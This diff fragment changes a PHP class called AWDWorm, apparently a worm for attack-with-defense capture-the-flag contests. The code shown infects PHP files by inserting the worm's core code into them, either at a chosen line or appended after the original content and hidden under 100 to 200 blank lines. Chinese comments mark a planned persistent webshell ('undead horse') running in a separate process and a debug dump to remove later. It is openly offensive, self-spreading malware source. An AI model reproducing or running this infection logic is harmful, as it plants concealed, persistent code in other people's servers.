@@ -67,7 +67,7 @@ class AWDWorm
     }
     public function infectFile($file)
     {
-        // do nothing
+        // 显示文件列表,后期去除
         var_dump($file);
         global $worm_step_line;
         $origin_code_content = file_get_contents($file);
@@ -83,7 +83,6 @@ class AWDWorm
             $infect_code_content .= $this->worm_core_code;
             $end_space_lines_num = mt_rand(100, 200);
             for ($i = 0; $i < $end_space_lines_num; $i++) $infect_code_content .= "\n";
-            // to do 新开一个进程 加入 不死马功能
         } else {
             $origin_code_content_lineArr[$worm_step_line] = $this->worm_core_code;
             $infect_code_content = implode("\n", $origin_code_content_lineArr);
@@ -92,6 +91,7 @@ class AWDWorm
     }
     public function write_file_with_undead($file, $content)
     {
+        // to do 新开一个进程 加入 不死马功能
         file_put_contents($file, $content);
     }
 }
